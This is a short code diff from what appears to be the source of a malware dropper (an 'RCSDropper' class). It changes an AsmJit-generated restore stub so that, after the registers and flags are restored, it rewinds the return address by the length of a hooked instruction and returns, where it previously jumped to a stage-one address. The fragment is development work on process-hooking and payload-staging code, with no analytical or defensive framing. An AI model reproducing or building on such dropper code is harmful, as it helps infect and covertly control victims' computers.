@@ -100,7 +100,8 @@ std::size_t RCSDropper::restoreStub(DWORD currentVA) {
     stub.call(((DWORD) restore) + (dropperVA - currentVA));
     stub.popad();
     stub.popfd();
-    stub.jmp(((DWORD) restore) + (stage1VA - currentVA));
+    stub.sub( AsmJit::dword_ptr(AsmJit::esp, 0), hookedInstruction_.len );
+    stub.ret();
     
     stub.relocCode((void*) restore);
 
